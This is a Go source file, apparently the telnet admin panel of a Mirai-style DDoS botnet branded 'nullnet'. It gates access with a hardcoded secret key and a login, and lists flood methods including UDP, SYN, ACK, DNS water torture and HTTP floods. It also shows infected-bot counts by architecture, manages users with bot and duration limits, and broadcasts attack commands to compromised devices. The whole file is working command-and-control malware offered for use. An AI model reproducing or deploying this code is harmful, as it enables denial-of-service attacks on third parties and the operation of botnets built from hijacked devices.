package main

import (
	"fmt"
	"math"
	"net"
	"strconv"
	"strings"
	"time"

	cpu "github.com/mackerelio/go-osstat/cpu"
	mem "github.com/mackerelio/go-osstat/memory"
	uptime "github.com/mackerelio/go-osstat/uptime"
)

type Admin struct {
	conn net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
	return &Admin{conn}
}

func (this *Admin) Handle() {
	this.conn.Write([]byte("\033[?1049h"))
	this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

	defer func() {
		this.conn.Write([]byte("\033[?1049l"))
	}()

	// Get secret
	this.conn.SetDeadline(time.Now().Add(60 * time.Second))
	secret, err := this.ReadLine(false)
	if err != nil {
		return
	}
	// anti crash, fuck kidz
	if len(secret) > 20 {
		return
	}
	if secret != "nullnet" {
		return
	}
	// Get username
	this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\033[01;34mNice, you know secert key, please login now.\033[01;31m \r\n"))
	this.conn.Write([]byte("\r\n"))
	this.conn.Write([]byte("\r\n"))
	this.conn.SetDeadline(time.Now().Add(60 * time.Second))
	this.conn.Write([]byte("\033[1;34mUsername\033[\033[01;37m: \033[01;37m"))
	username, err := this.ReadLine(false)
	if err != nil {
		return
	}

	// Get password
	this.conn.SetDeadline(time.Now().Add(60 * time.Second))
	this.conn.Write([]byte("\033[1;34mPassword\033[\033[01;37m: \033[01;37m"))
	password, err := this.ReadLine(true)
	if err != nil {
		return
	}
	//Attempt  Login
	this.conn.SetDeadline(time.Now().Add(120 * time.Second))
	this.conn.Write([]byte("\r\n"))
	spinBuf := []byte{'-', '\\', '|', '/'}
	for i := 0; i < 50; i++ {
		this.conn.Write(append([]byte("\r\033[1;34mLoading... "), spinBuf[i%len(spinBuf)]))
		time.Sleep(time.Duration(100) * time.Millisecond)
	}
	this.conn.Write([]byte("\r\n"))

	//if credentials are incorrect output error and close session
	var loggedIn bool
	var userInfo AccountInfo
	if loggedIn, userInfo = database.TryLogin(username, password, this.conn.RemoteAddr()); !loggedIn {
		this.conn.Write([]byte("\r\033[01;90mTry again.\r\n"))
		buf := make([]byte, 1)
		this.conn.Read(buf)
		return
	}
	// Header
	this.conn.Write([]byte("\r\n\033[0m"))
	go func() {
		i := 0
		for {
			var BotCount int
			if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
				BotCount = userInfo.maxBots
			} else {
				BotCount = clientList.Count()
			}

			time.Sleep(time.Second)
			if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0; [%d] nullnet@%s\007", BotCount, username))); err != nil {
				this.conn.Close()
				break
			}
			i++
			if i%60 == 0 {
				this.conn.SetDeadline(time.Now().Add(120 * time.Second))
			}
		}
	}()

	this.conn.Write([]byte("\033[2J\033[1H")) //display main header
	this.conn.Write([]byte("\r\n"))
	this.conn.Write([]byte("\033[0;37mConnection initialized as \033[1;34m" + username + "\r\n"))
	this.conn.Write([]byte("\r\n"))
	fmt.Println("\033[0;37mNew connection initialized, user: \033[1;34m" + username + "\r\n")

	for {
		var botCatagory string
		var botCount int
		this.conn.Write([]byte("\033[1;34m" + username + "\033[1;31m@\033[1;34mnullnet\033[01;31m: \033[1;34m$ \033[01;37m \033[01;37m"))
		cmd, err := this.ReadLine(false)

		if err != nil || cmd == "exit" || cmd == "quit" {
			return
		}
		if cmd == "" {
			continue
		}
		if err != nil || cmd == "cc" || cmd == "cl" || cmd == "clear" { // clear screen
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\033[1;34m         -+:               :-=======-:. \033[0;34m.:--======-:.              .=*          \r\n"))
			this.conn.Write([]byte("\033[1;34m         #@@@#+-.     :-+%@@@@@#####%@@@\033[0;34m@@@%####%@@@@@#+-.    .:=*@@@@-         \r\n"))
			this.conn.Write([]byte("\033[1;34m         @@@@@@@@@@@@@@@@@@@@%####*+-..-\033[0;34m: .=+*####@@@@@@@@@@@@@@@@@@@@+         \r\n"))
			this.conn.Write([]byte("\033[1;34m         @@@@@@@@@@@@@@@@@%#+==-:::-=++-\033[0;34m=++-::::-=+*#@@@@@@@@@@@@@@@@@+         \r\n"))
			this.conn.Write([]byte("\033[1;34m         #@@@@@@@@@@@@@@@@@@@@@@@@%*=.  \033[0;34m  -+#@@@@@@@@@@@@@@@@@@@@@@@@@-         \r\n"))
			this.conn.Write([]byte("\033[1;34m         :@@@@@@@@@@@@@@@#*+=::..::-+**=\033[0;34m+#+=-:...:-=+*#@@@@@@@@@@@@@@%          \r\n"))
			this.conn.Write([]byte("\033[1;34m          =@@@@@@@@@@@@@@@@@@@@@@%*=:   \033[0;34m  .-+#%@@@@@@@@@@@@@@@@@@@@@%.          \r\n"))
			this.conn.Write([]byte("\033[1;34m           -@@@@@@@@=*@@@@@@@@@@@@@@@@*:\033[0;34m=%@@@@@@@@@@@@@@@@=#@@@@@@@#            \r\n"))
			this.conn.Write([]byte("\033[1;34m           :#@@@@@@. #%@@@@@@@@@@@@@@@@@\033[0;34m@@@@@@@@@@@@@@@@@%= +@@@@@@+            \r\n"))
			this.conn.Write([]byte("\033[1;34m         =%@@@@@@@%    \033[1;31m:+==\033[1;34m*%@@@@@@@@@@@\033[0;34m@@@@@@@@@@@\033[1;31m#====    \033[0;34m-@@@@@@@@*.         \r\n"))
			this.conn.Write([]byte("\033[1;34m       +@@@@@@@@@@#    \033[1;31m#@#:- \033[1;34m-@@@@@@@@@@\033[0;34m@@@@@@@@@*\033[1;31m.::+%@:   \033[0;34m-@@@@@@@@@@#:       \r\n"))
			this.conn.Write([]byte("\033[1;34m     -%@@@#==%@@@@. \033[1;31m:#--@+-#%:.\033[1;34m%@@@@@@@@\033[0;34m@@@@@@@@+ \033[1;31m+@+-%#.*+ \033[0;34m =@@@@*-*@@@@*      \r\n"))
			this.conn.Write([]byte("\033[1;34m    *@@*-  -@@@@@# \033[1;31m=@@@%++:..  .\033[1;34m%@@@@@@@\033[0;34m@@@@@@@=   \033[1;31m::-+*@@@%\033[0;34m..@@@@@#  :+%@@-    \r\n"))
			this.conn.Write([]byte("\033[1;34m  .%#-    -@@@@@@%.@@@@@@*%@@@@%=@@@@@@@\033[0;34m@@@@@@#*@@@@@##@@@@@*-@@@@@@%    .+@+   \r\n"))
			this.conn.Write([]byte("\033[1;34m :*:      %@@@@@@@%@@@@@@@@%**@@@@@@@@@@\033[0;34m@@@@@@@@@#*#@@@@@@@@@%@@@@@@@=      =+  \r\n"))
			this.conn.Write([]byte("\033[1;34m .       :#=*@@@@@@@@@@@@- -%@@@@@@@@@@@\033[0;34m@@@@@@@@@@@*..*@@@@@@@@@@@@=+*          \r\n"))
			this.conn.Write([]byte("\033[1;34m            @@@@@@@@@@+-.:=#@@@=#@@@@@@@\033[0;34m@@@@@@@-%@@%*-.:=#@@@@@@@@@+            \r\n"))
			this.conn.Write([]byte("\033[1;34m           +@@@@@@@@+  :@@@@@@@ *@@@@@@@\033[0;34m@@@@@@@ +@@@@@@*  :%@@@@@@@@            \r\n"))
			this.conn.Write([]byte("\033[1;34m           #@@@@@@@=   :@@@@@@@= -:  =#%\033[0;34m#*:  -. %@@@@@@*    %@@@@@@@:           \r\n"))
			this.conn.Write([]byte("\033[1;34m           %@*@@@@@   @*==*@@@@@%-      \033[0;34m     .+@@@@@#+=+%+  =@@@@#%@:           \r\n"))
			this.conn.Write([]byte("\033[1;34m           #: @@@@@.  =@@@%##@@@@@@#=.  \033[0;34m  :+%@@@@@%#%@@@%.  +@@@@= *:           \r\n"))
			this.conn.Write([]byte("\033[1;34m              #@@#*-   -++**##%@@@@@@@: \033[0;34m *@@@@@@@#%#**+=.   +*@@@.              \r\n"))
			this.conn.Write([]byte("\033[1;34m              .@=      .*@@@@@@@@@@@@@@ \033[0;34m=@@@@@@@@@@@@@#-       %+               \r\n"))
			this.conn.Write([]byte("\033[1;34m               ..          :===+*#@%#*+ \033[0;34m-+*#@@#++==-.          :                \r\n"))
			this.conn.Write([]byte("\033[1;34m                            :-==-: :----\033[0;34m---: .--=--.                            \r\n"))
			this.conn.Write([]byte("\033[1;34m                            -@@#:  @**+=\033[0;34m+=+@=  *%@%                             \r\n"))
			this.conn.Write([]byte("\033[1;34m                            -@@@   :    \033[0;34m    .  *@@@                             \r\n"))
			this.conn.Write([]byte("\033[1;34m                             %@%        \033[0;34m       -@@=                             \r\n"))
			this.conn.Write([]byte("\033[1;34m                             .%#        \033[0;34m       :@+                              \r\n"))
			this.conn.Write([]byte("\033[1;34m                               +        \033[0;34m       :-                             \r\n"))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte("\r\n"))
			continue
		}
		if err != nil || cmd == "top" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\r\n"))
			_, err := cpu.Get()
			if err == nil {
				before, _ := cpu.Get()
				time.Sleep(time.Duration(2) * time.Second)
				after, _ := cpu.Get()
				total := float64(after.Total - before.Total)
				cpustr := fmt.Sprintf("Total: \033[1;31m%.2f %% \033[1;34m| User: \033[1;31m%.2f %% \033[1;34m| System: \033[1;31m%.2f %% \033[1;34m| Idle: \033[1;31m%.2f %%", total, float64(after.User-before.User)/total*100, float64(after.System-before.System)/total*100, float64(after.Idle-before.Idle)/total*100)
				this.conn.Write([]byte(fmt.Sprintf("\033[1;34mCPU\t\t%s\r\n", cpustr)))
			}
			mem_stat, err := mem.Get()
			if err == nil {
				ramstr := fmt.Sprintf("\033[1;31m%s \033[1;34m/ \033[1;31m%s", ByteFormat(float64(mem_stat.Used), 1), ByteFormat(float64(mem_stat.Total), 1))
				this.conn.Write([]byte(fmt.Sprintf("\033[1;34mRAM\t\t%s\r\n", ramstr)))
			}
			up_stat, err := uptime.Get()
			if err == nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[1;34mUptime\t\t%+v\r\n", up_stat)))
			}
			continue
		}
		if err != nil || cmd == "methods" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte("\033[1;34m \t\t [ \033[1;31mmethods \033[1;34m]\r\n"))
			this.conn.Write([]byte("\x1b[1;34m !udpflood\t\t\x1b[1;37mcustom udp flood with min / maxlen and payload options       \x1b[1;35m\x1b[1;37m\r\n"))
			this.conn.Write([]byte("\x1b[1;34m !udpbypass\t\t\x1b[1;37mudpbypass with managet packets and data                     \x1b[1;35m\x1b[1;37m\r\n"))
			this.conn.Write([]byte("\x1b[1;34m !stdhex\t\t\x1b[1;37mcomplex std flood made for bypass                              \x1b[1;32m\x1b[1;37m\r\n"))
			this.conn.Write([]byte("\x1b[1;34m !raw\t\t\t\x1b[1;37mraw udp flood                                                     \x1b[1;35m\x1b[1;37m\r\n"))
			this.conn.Write([]byte("\x1b[1;34m !dns\t\t\t\x1b[1;37mdns water torture flood                                           \x1b[1;35m\x1b[1;37m\r\n"))
			this.conn.Write([]byte("\x1b[1;34m !synflood\t\t\x1b[1;37mtcp syn flood                                                \x1b[1;35m\x1b[1;37m\r\n"))
			this.conn.Write([]byte("\x1b[1;34m !ackflood\t\t\x1b[1;37mbasic tcp flood with ack flag                                \x1b[1;32m\x1b[1;37m\r\n"))
			this.conn.Write([]byte("\x1b[1;34m !stomp\t\t\t\x1b[1;37mtcp stomp flood                                                 \x1b[1;35m\x1b[1;37m\r\n"))
			this.conn.Write([]byte("\x1b[1;34m !storm\t\t\t\x1b[1;37mack+psh tcp flood                                               \x1b[1;35m\x1b[1;37m\r\n"))
			this.conn.Write([]byte("\x1b[1;34m !http\t\t\x1b[1;37mcustom layer7 application / http flood                     \x1b[1;32m\x1b[1;37m\r\n"))
			this.conn.Write([]byte("\r\n"))
			continue
		}

		if err != nil || cmd == "help" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\r\n\033[0m"))
			this.conn.Write([]byte("\033[1;34m \t\t [ \033[1;31mhelp \033[1;34m]\r\n"))
			this.conn.Write([]byte("\033[1;34m methods\t\t\033[1;37m shows attack methods\r\n"))
			this.conn.Write([]byte("\033[1;34m block / unblock\t\033[1;37m block or unblock attack to ip range\r\n"))
			this.conn.Write([]byte("\033[1;34m bots\t\t\t\033[1;37m shows botcount and bot architectures\r\n"))
			this.conn.Write([]byte("\033[1;34m top\t\t\t\033[1;37m check system info\r\n"))
			this.conn.Write([]byte("\033[1;34m addadmin\t\t\033[1;37m add an admin\r\n"))
			this.conn.Write([]byte("\033[1;34m addbasic\t\t\033[1;37m add an user\r\n"))
			this.conn.Write([]byte("\033[1;34m removeuser\t\t\033[1;37m remove an user\r\n"))
			this.conn.Write([]byte("\r\n\033[0m"))
			continue
		}

		if userInfo.admin == 1 && cmd == "block" {
			this.conn.Write([]byte("\033[0mPut the IP (next prompt will be asking for prefix):\033[01;37m "))
			new_pr, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[0mPut the Netmask (after slash):\033[01;37m "))
			new_nm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[0mWe are going to block all attacks attempts to this ip range: \033[97m" + new_pr + "/" + new_nm + "\r\n\033[0mContinue? \033[01;37m(\033[01;32my\033[01;37m/\033[01;31mn\033[01;37m) "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.BlockRange(new_pr, new_nm) {
				this.conn.Write([]byte(fmt.Sprintf("\033[1;34m%s\033[0m\r\n", "An unknown error occured.")))
			} else {
				this.conn.Write([]byte("\033[32;1mSuccessful!\033[0m\r\n"))
			}
			continue
		}

		if userInfo.admin == 1 && cmd == "unblock" {
			this.conn.Write([]byte("\033[0mPut the prefix that you want to remove from whitelist: \033[01;37m"))
			rm_pr, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[0mPut the netmask that you want to remove from whitelist (after slash):\033[01;37m "))
			rm_nm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[0mWe are going to unblock all attacks attempts to this ip range: \033[97m" + rm_pr + "/" + rm_nm + "\r\n\033[0mContinue? \033[01;37m(\033[01;32my\033[01;37m/\033[01;31mn\033[01;37m) "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.UnBlockRange(rm_pr) {
				this.conn.Write([]byte(fmt.Sprintf("\033[01;31mUnable to remove that ip range\r\n")))
			} else {
				this.conn.Write([]byte("\033[01;32mSuccessful!\r\n"))
			}
			continue
		}

		botCount = userInfo.maxBots

		if userInfo.admin == 1 && cmd == "addbasic" {
			this.conn.Write([]byte("\033[0mUsername:\033[01;37m "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[0mPassword:\033[01;37m "))
			new_pw, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[0mBotcount\033[01;37m(\033[0m-1 for access to all\033[01;37m)\033[0m:\033[01;37m "))
			max_bots_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			max_bots, err := strconv.Atoi(max_bots_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[1;34m%s\033[0m\r\n", "Failed to parse the bot count")))
				continue
			}
			this.conn.Write([]byte("\033[0mAttack Duration\033[01;37m(\033[0m-1 for none\033[01;37m)\033[0m:\033[01;37m "))
			duration_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			duration, err := strconv.Atoi(duration_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[1;34m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
				continue
			}
			this.conn.Write([]byte("\033[0mCooldown\033[01;37m(\033[0m0 for none\033[01;37m)\033[0m:\033[01;37m "))
			cooldown_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			cooldown, err := strconv.Atoi(cooldown_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[1;34m%s\033[0m\r\n", "Failed to parse the cooldown")))
				continue
			}
			this.conn.Write([]byte("\033[0m- New user info - \r\n- Username - \033[01;37m" + new_un + "\r\n\033[0m- Password - \033[01;37m" + new_pw + "\r\n\033[0m- Bots - \033[01;37m" + max_bots_str + "\r\n\033[0m- Max Duration - \033[01;37m" + duration_str + "\r\n\033[0m- Cooldown - \033[01;37m" + cooldown_str + "   \r\n\033[0mContinue? \033[01;37m(\033[01;32my\033[01;37m/\033[01;31mn\033[01;37m) "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.CreateBasic(new_un, new_pw, max_bots, duration, cooldown) {
				this.conn.Write([]byte(fmt.Sprintf("\033[1;34m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
			} else {
				this.conn.Write([]byte("\033[32;1mUser added successfully.\033[0m\r\n"))
			}
			continue
		}
		if userInfo.admin == 1 && cmd == "addbasic" {
			this.conn.Write([]byte("\033[0mUsername:\033[01;37m "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[0mPassword:\033[01;37m "))
			new_pw, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[0mBotcount\033[01;37m(\033[0m-1 for access to all\033[01;37m)\033[0m:\033[01;37m "))
			max_bots_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			max_bots, err := strconv.Atoi(max_bots_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[1;34m%s\033[0m\r\n", "Failed to parse the bot count")))
				continue
			}
			this.conn.Write([]byte("\033[0mAttack Duration\033[01;37m(\033[0m-1 for none\033[01;37m)\033[0m:\033[01;37m "))
			duration_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			duration, err := strconv.Atoi(duration_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[1;34m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
				continue
			}
			this.conn.Write([]byte("\033[0mCooldown\033[01;37m(\033[0m0 for none\033[01;37m)\033[0m:\033[01;37m "))
			cooldown_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			cooldown, err := strconv.Atoi(cooldown_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[1;34m%s\033[0m\r\n", "Failed to parse the cooldown")))
				continue
			}
			this.conn.Write([]byte("\033[0m- New user info - \r\n- Username - \033[01;37m" + new_un + "\r\n\033[0m- Password - \033[01;37m" + new_pw + "\r\n\033[0m- Bots - \033[01;37m" + max_bots_str + "\r\n\033[0m- Max Duration - \033[01;37m" + duration_str + "\r\n\033[0m- Cooldown - \033[01;37m" + cooldown_str + "   \r\n\033[0mContinue? \033[01;37m(\033[01;32my\033[01;37m/\033[01;31mn\033[01;37m) "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.CreateBasic(new_un, new_pw, max_bots, duration, cooldown) {
				this.conn.Write([]byte(fmt.Sprintf("\033[1;34m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
			} else {
				this.conn.Write([]byte("\033[32;1mUser added successfully.\033[0m\r\n"))
			}
			continue
		}

		if userInfo.admin == 1 && cmd == "removeuser" {
			this.conn.Write([]byte("\033[01;37mUsername: \033[1;34m"))
			rm_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte(" \033[01;37mAre You Sure You Want To Remove \033[01;37m" + rm_un + "?\033[01;37m(\033[01;32my\033[01;37m/\033[01;31mn\033[01;37m) "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.RemoveUser(rm_un) {
				this.conn.Write([]byte(fmt.Sprintf("\033[01;31mUnable to remove users\r\n")))
			} else {
				this.conn.Write([]byte("\033[01;32mUser Successfully Removed!\r\n"))
			}
			continue
		}

		botCount = userInfo.maxBots

		if userInfo.admin == 1 && cmd == "addadmin" {
			this.conn.Write([]byte("\033[0mUsername:\033[01;37m "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}

			this.conn.Write([]byte("\033[0mPassword:\033[01;37m "))
			new_pw, err := this.ReadLine(false)
			if err != nil {
				return
			}

			this.conn.Write([]byte("\033[0mBotcount\033[01;37m(\033[0m-1 for access to all\033[01;37m)\033[0m:\033[01;37m "))
			max_bots_str, err := this.ReadLine(false)
			if err != nil {
				return
			}

			max_bots, err := strconv.Atoi(max_bots_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[1;34m%s\033[0m\r\n", "Failed to parse the bot count")))
				continue
			}

			this.conn.Write([]byte("\033[0mAttack Duration\033[01;37m(\033[0m-1 for none\033[01;37m)\033[0m:\033[01;37m "))
			duration_str, err := this.ReadLine(false)
			if err != nil {
				return
			}

			duration, err := strconv.Atoi(duration_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[1;34m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
				continue
			}

			this.conn.Write([]byte("\033[0mCooldown\033[01;37m(\033[0m0 for none\033[01;37m)\033[0m:\033[01;37m "))
			cooldown_str, err := this.ReadLine(false)
			if err != nil {
				return
			}

			cooldown, err := strconv.Atoi(cooldown_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[1;34m%s\033[0m\r\n", "Failed to parse the cooldown")))
				continue
			}

			this.conn.Write([]byte("\033[0m- New user info - \r\n- Username - \033[01;37m" + new_un + "\r\n\033[0m- Password - \033[01;37m" + new_pw + "\r\n\033[0m- Bots - \033[01;37m" + max_bots_str + "\r\n\033[0m- Max Duration - \033[01;37m" + duration_str + "\r\n\033[0m- Cooldown - \033[01;37m" + cooldown_str + "   \r\n\033[0mContinue? \033[01;37m(\033[01;32my\033[01;37m/\033[01;31mn\033[01;37m) "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}

			if confirm != "y" {
				continue
			}

			if !database.CreateAdmin(new_un, new_pw, max_bots, duration, cooldown) {
				this.conn.Write([]byte(fmt.Sprintf("\033[1;34m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
			} else {
				this.conn.Write([]byte("\033[32;1mUser added successfully.\033[0m\r\n"))
			}

			continue
		}

		if cmd == "bots" || cmd == "devices" {
			this.conn.Write([]byte("\033[01;37m  \033[0m\r\n"))
			botCount = clientList.Count()
			m := clientList.Distribution()
			for k, v := range m {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[01;34m%s\t\t\t\x1b[1;31m%d\033[0m\r\n\033[0m", k, v)))
			}

			this.conn.Write([]byte(fmt.Sprintf("\033[01;37mTotal Bots: \033[01;37m[\033[1;34m%d\033[01;37m]\r\n\033[0m", botCount)))
			this.conn.Write([]byte("\033[01;37m  \033[0m\r\n"))
			continue
		}

		if cmd[0] == '-' {
			countSplit := strings.SplitN(cmd, " ", 2)
			count := countSplit[0][1:]
			botCount, err = strconv.Atoi(count)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[1;34mFailed to parse botcount \"%s\"\033[0m\r\n", count)))
				continue
			}
			if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
				this.conn.Write([]byte(fmt.Sprintf("\033[1;34mBot count to send is bigger then allowed bot maximum\033[0m\r\n")))
				continue
			}
			cmd = countSplit[1]
		}

		atk, err := NewAttack(cmd, userInfo.admin)
		if err != nil {
			this.conn.Write([]byte(fmt.Sprintf("\033[1;34m%s\033[0m\r\n", err.Error())))
		} else {
			buf, err := atk.Build()
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[1;34m%s\033[0m\r\n", err.Error())))
			} else {
				if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
					this.conn.Write([]byte(fmt.Sprintf("\033[1;34m%s\033[0m\r\n", err.Error())))
				} else if !database.ContainsWhitelistedTargets(atk) {
					clientList.QueueBuf(buf, botCount, botCatagory)
					var YotCount int
					if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
						YotCount = userInfo.maxBots
					} else {
						YotCount = clientList.Count()
					}
					this.conn.Write([]byte(fmt.Sprintf("\033[1;34mattack command broadcasted to \033[1;31m%d \033[1;34mdevices \r\n", YotCount)))
				} else {
					this.conn.Write([]byte(fmt.Sprintf("\033[1;31mThis address is whitelisted by our botnet which means you can't attack none of ip's in this range.\033[0;31m\r\n")))
					fmt.Println("" + username + " tried to attack on one of whitelisted ip ranges")
				}
			}
		}
	}
}

func (this *Admin) ReadLine(masked bool) (string, error) {
	buf := make([]byte, 1024)
	bufPos := 0

	for {

		if bufPos > 1023 { //credits to Insite <3
			fmt.Printf("Sup?")
			return "", *new(error)
		}

		n, err := this.conn.Read(buf[bufPos : bufPos+1])
		if err != nil || n != 1 {
			return "", err
		}
		if buf[bufPos] == '\xFF' {
			n, err := this.conn.Read(buf[bufPos : bufPos+2])
			if err != nil || n != 2 {
				return "", err
			}
			bufPos--
		} else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
			if bufPos > 0 {
				this.conn.Write([]byte(string(buf[bufPos])))
				bufPos--
			}
			bufPos--
		} else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
			bufPos--
		} else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
			this.conn.Write([]byte("\r\n"))
			return string(buf[:bufPos]), nil
		} else if buf[bufPos] == 0x03 {
			this.conn.Write([]byte("^C\r\n"))
			return "", nil
		} else {
			if buf[bufPos] == '\x1B' {
				buf[bufPos] = '^'
				this.conn.Write([]byte(string(buf[bufPos])))
				bufPos++
				buf[bufPos] = '['
				this.conn.Write([]byte(string(buf[bufPos])))
			} else if masked {
				this.conn.Write([]byte("*"))
			} else {
				this.conn.Write([]byte(string(buf[bufPos])))
			}
		}
		bufPos++
	}
	return string(buf), nil
}
func RoundUp(input float64, places int) (newVal float64) {
	var round float64
	pow := math.Pow(10, float64(places))
	digit := pow * input
	round = math.Ceil(digit)
	newVal = round / pow
	return
}
func ByteFormat(inputNum float64, precision int) string {

	if precision <= 0 {
		precision = 1
	}
	var unit string
	var returnVal float64

	if inputNum >= 1000000000000000000000000 {
		returnVal = RoundUp((inputNum / 1208925819614629174706176), precision)
		unit = " YB" // yottabyte
	} else if inputNum >= 1000000000000000000000 {
		returnVal = RoundUp((inputNum / 1180591620717411303424), precision)
		unit = " ZB" // zettabyte
	} else if inputNum >= 10000000000000000000 {
		returnVal = RoundUp((inputNum / 1152921504606846976), precision)
		unit = " EB" // exabyte
	} else if inputNum >= 1000000000000000 {
		returnVal = RoundUp((inputNum / 1125899906842624), precision)
		unit = " PB" // petabyte
	} else if inputNum >= 1000000000000 {
		returnVal = RoundUp((inputNum / 1099511627776), precision)
		unit = " TB" // terrabyte
	} else if inputNum >= 1000000000 {
		returnVal = RoundUp((inputNum / 1073741824), precision)
		unit = " GB" // gigabyte
	} else if inputNum >= 1000000 {
		returnVal = RoundUp((inputNum / 1048576), precision)
		unit = " MB" // megabyte
	} else if inputNum >= 1000 {
		returnVal = RoundUp((inputNum / 1024), precision)
		unit = " KB" // kilobyte
	} else {
		returnVal = inputNum
		unit = " bytes" // byte
	}
	return strconv.FormatFloat(returnVal, 'f', precision, 64) + unit
}
